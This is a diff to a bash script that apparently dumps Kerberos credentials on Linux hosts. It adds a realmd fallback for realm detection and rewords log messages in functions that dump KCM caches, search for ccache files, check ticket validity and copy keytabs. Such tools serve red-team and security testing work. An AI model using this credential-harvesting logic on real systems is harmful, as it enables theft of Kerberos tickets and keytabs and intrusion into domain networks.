@@ -145,13 +145,25 @@ mkdir -p "$OUTPUT_DIR"
 
 # Detect the Kerberos realm configured on the system
 detect_kerberos_realm() {
-    # Extract the default realm from krb5.conf
-    realm=$(awk -F '=' '/^[[:space:]]*default_realm/ {gsub(/[[:space:]]/, "", $2); print $2; exit}' /etc/krb5.conf)
+    # 1) Try extracting the default realm from /etc/krb5.conf
+    realm=$(awk -F '=' '/^[[:space:]]*default_realm/ {gsub(/[[:space:]]/, "", $2); print $2; exit}' /etc/krb5.conf 2>/dev/null || true)
     if [ -n "$realm" ]; then
-        print_msg INFO "Kerberos realm detected: $realm"
-    else
-        print_msg WARN "No Kerberos realm found in /etc/krb5.conf."
+        print_msg INFO "Kerberos realm detected : $realm"
+        return 0
     fi
+
+    # 2) Fallback: try realm list (realmd)
+    if command -v realm >/dev/null 2>&1; then
+        realm=$(realm list 2>/dev/null | awk 'NF{print $1; exit}' || true)
+    fi
+    if [ -n "$realm" ]; then
+        print_msg INFO "Kerberos realm detected : $realm"
+        return 0
+    fi
+
+    # If neither method found a realm, abort
+    print_msg ERROR "No Kerberos realm detected. Exiting."
+    exit 1
 }
 
 
@@ -359,7 +371,7 @@ dump_kcm() {
             elif command -v perl >/dev/null 2>&1; then
             dd if="$file" bs=1 skip="$off" count="$len" 2>/dev/null | perl -lpe '$_=unpack("H*",$_)'
         else
-            print_msg ERROR "ERR_NO_HEXDUMP_TOOL"
+            print_msg ERROR "No suitable read hex tool found"
             return 1
         fi
     }
@@ -725,7 +737,7 @@ dump_user() {
 
 # Search and dump any valid cache files on the system
 dump_all() {
-    print_msg INFO "Scanning for ccache files..."
+    print_msg INFO "Searching for ccache files..."
 
     # gather unique candidates
     declare -a candidates
@@ -802,7 +814,7 @@ dump_all() {
                 if [ -n "$ticket_line" ]; then
                     start_field=$(printf "%s" "$ticket_line" | awk '{print $1" "$2}')
                     expires_field=$(printf "%s" "$ticket_line" | awk '{print $3" "$4}')
-                    print_msg DEBUG "Ticket validity for $outfile: $start_field -> $expires_field"
+                    #print_msg DEBUG "Ticket validity for $outfile: $start_field -> $expires_field"
                     start_epoch=$(date -d "$start_field" +%s 2>/dev/null || true)
                     expires_epoch=$(date -d "$expires_field" +%s 2>/dev/null || true)
                     now_epoch=$(date +%s)
@@ -845,7 +857,7 @@ dump_all() {
             # find next available keytab filename
             kt_out=$(next_outfile "keytab" ".keytab")
             if cp -- "$kf" "$kt_out" 2>/dev/null; then
-                print_msg SUCCESS "Copied keytab $kf -> $kt_out"
+                print_msg SUCCESS "Dumped keytab $kf -> $kt_out"
             else
                 print_msg ERROR "Failed to copy keytab $kf -> $kt_out"
             fi
@@ -875,7 +887,7 @@ detect_kerberos_realm
 
 # Handle modes: dump, monitor
 if [[ "$MODE" == "dump" ]]; then
-    print_msg INFO "Searching for any kerberos material on the system"
+    print_msg INFO "Dumping any kerberos material on the system"
     dump_all
     print_msg INFO "Dump complete"
     elif [[ "$MODE" == "monitor" ]]; then
